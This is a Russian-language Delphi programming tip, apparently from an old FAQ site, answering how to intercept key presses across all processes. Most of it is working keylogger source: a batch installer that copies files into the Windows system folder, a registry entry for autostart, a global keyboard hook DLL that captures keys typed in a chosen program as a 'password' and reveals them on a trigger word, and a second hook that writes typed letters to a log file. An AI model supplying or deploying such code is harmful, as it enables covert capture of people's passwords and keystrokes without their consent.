---
Title: Как отловить нажатия клавиш для всех процессов в системе?
Date: 01.01.2007
---


Как отловить нажатия клавиш для всех процессов в системе?
=========================================================

::: {.date}
01.01.2007
:::

 

::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
  --- -----------
  ·   Setup.bat
  --- -----------
:::

    @echo off
    copy HookAgnt.dll %windir%\system
    copy kbdhook.exe %windir%\system
    start HookAgnt.reg

::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
  --- --------------
  ·   HookAgnt.reg
  --- --------------
:::

    REGEDIT4
     
    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
    "kbdhook"="kbdhook.exe"

::: {style="text-align: left; text-indent: 0px; padding: 0px 0px 0px 0px; margin: 0px 0px 0px 14px;"}
  --- -------------
  ·   KbdHook.dpr
  --- -------------
:::

    program cwbhook;
     
    uses
      Windows, Dialogs;
     
    var
      hinstDLL: HINST;
      hkprcKeyboard: TFNHookProc;
      msg: TMsg;
     
    begin
      hinstDLL := LoadLibrary('HookAgnt.dll');
      hkprcKeyboard := GetProcAddress(hinstDLL, 'KeyboardProc');
      SetWindowsHookEx(WH_KEYBOARD, hkprcKeyboard, hinstDLL, 0);
      repeat
      until
        not GetMessage(msg, 0, 0, 0);
    end.

HookAgnt.dpr

    library HookAgent;
     
    uses
      Windows, KeyboardHook in 'KeyboardHook.pas';
     
    exports
      KeyboardProc;
     
    var
      hFileMappingObject: THandle;
      fInit: Boolean;
     
    {----------------------------
    | |
    | DLL_PROCESS_DETACH |
    | |
    \----------------------------}
     
    procedure DLLMain(Reason: Integer);
    begin
      if Reason = DLL_PROCESS_DETACH then
      begin
        UnmapViewOfFile(lpvMem);
        CloseHandle(hFileMappingObject);
      end;
    end;
     
    {----------------------------
    | |
    | DLL_PROCESS_ATTACH |
    | |
    \----------------------------}
     
    begin
      DLLProc := @DLLMain;
     
      hFileMappingObject := CreateFileMapping(
      THandle($FFFFFFFF), // use paging file
      nil, // no security attributes
      PAGE_READWRITE, // read/write access
      0, // size: high 32 bits
      4096, // size: low 32 bits
      'HookAgentShareMem' // name of map object
      );
     
      if hFileMappingObject = INVALID_HANDLE_VALUE then
      begin
        ExitCode := 1;
        Exit;
      end;
     
      fInit := GetLastError() <> ERROR_ALREADY_EXISTS;
     
      lpvMem := MapViewOfFile(
      hFileMappingObject, // object to map view of
      FILE_MAP_WRITE, // read/write access
      0, // high offset: map from
      0, // low offset: beginning
      0 // default: map entire file
      );
     
      if lpvMem = nil then
      begin
        CloseHandle(hFileMappingObject);
        ExitCode := 1;
        Exit;
      end;
     
      if fInit then
        FillChar(lpvMem, PASSWORDSIZE, #0);
     
    end.

KeyboardHook.pas

    unit KeyboardHook;
     
    interface
     
    uses
      Windows;
     
    const
      PASSWORDSIZE = 16;
     
    var
      g_hhk: HHOOK;
      g_szKeyword: array[0..PASSWORDSIZE-1] of char;
      lpvMem: Pointer;
     
      function KeyboardProc(nCode: Integer; wParam: WPARAM;
      lParam: LPARAM ): LRESULT; stdcall;
     
    implementation
     
    uses
      SysUtils, Dialogs;
     
      function KeyboardProc(nCode: Integer; wParam: WPARAM;
      lParam: LPARAM ): LRESULT;
     
    var
      szModuleFileName: array[0..MAX_PATH-1] of Char;
      szKeyName: array[0..16] of Char;
      lpszPassword: PChar;
     
    begin
      lpszPassword := PChar(lpvMem);
     
      if (nCode = HC_ACTION) and (((lParam shr 16) and KF_UP) = 0) then
      begin
        GetKeyNameText(lParam, szKeyName, sizeof(szKeyName));
     
        if StrLen(g_szKeyword) + StrLen(szKeyName) >= PASSWORDSIZE then
          lstrcpy(g_szKeyword, g_szKeyword + StrLen(szKeyName));
     
        lstrcat(g_szKeyword, szKeyName);
     
        GetModuleFileName(0, szModuleFileName, sizeof(szModuleFileName));
     
        if (StrPos(StrUpper(szModuleFileName),'__ТО_ЧЕГО_АДО__') <> nil) and
        (strlen(lpszPassword) + strlen(szKeyName) < PASSWORDSIZE) then
          lstrcat(lpszPassword, szKeyName);
     
        if StrPos(StrUpper(g_szKeyword), 'GOLDENEYE') <> nil then
        begin
          ShowMessage(lpszPassword);
          g_szKeyword[0] := #0;
        end;
     
        Result := 0;
      end
      else
        Result := CallNextHookEx(g_hhk, nCode, wParam, lParam);
    end;
     
    end.

 

------------------------------------------------------------------------

    library Hook;
    uses Windows, SysUtils;
    const KF_UP_MY = $40000000;
    var CurrentHook: HHook;
        KeyArray: array[0..19] of char;
        KeyArrayPtr: integer;
        CurFile:text;
    function GlobalKeyBoardHook(code: integer; wParam: integer; lParam:
    integer): longword; stdcall;
    var
    i:integer;
    begin
      if code< 0 then
       begin
         result:=CallNextHookEx(CurrentHook,code,wParam,lparam);
         Exit;
       end;
      if ( (lParam and KF_UP_MY ) = 0) and (wParam> =65) and (wParam< =90) then
        begin
          KeyArray[KeyArrayPtr]:=char(wParam);
          KeyArrayPtr:=KeyArrayPtr+1;
          if KeyArrayPtr> 19 then
           begin
            for i:=0 to 19 do
            begin
              Assignfile(CurFile,'d:\log.txt');
              if fileexists('d:\log.txt')=false then rewrite(CurFile)
              else Append(CurFile);
              write(Curfile, KeyArray[i]);
              closefile(curfile);
            end;
            KeyArrayPtr:=0;
           end;
        end;
        CallNextHookEx(CurrentHook,code,wParam,lparam);
        result:=0;
    end;
    procedure SetupGlobalKeyBoardHook;
    begin
      CurrentHook:=SetWindowsHookEx(WH_KEYBOARD, @GlobalKeyBoardHook,HInstance, 0);
      KeyArrayptr:=0;
    end;
    procedure unhook;
    begin
      UnhookWindowshookEx(CurrentHook);
    end;
     
    exports
     SetupGlobalKeyBoardHook, UnHook;
    begin
    end.

Взято с <https://delphiworld.narod.ru>
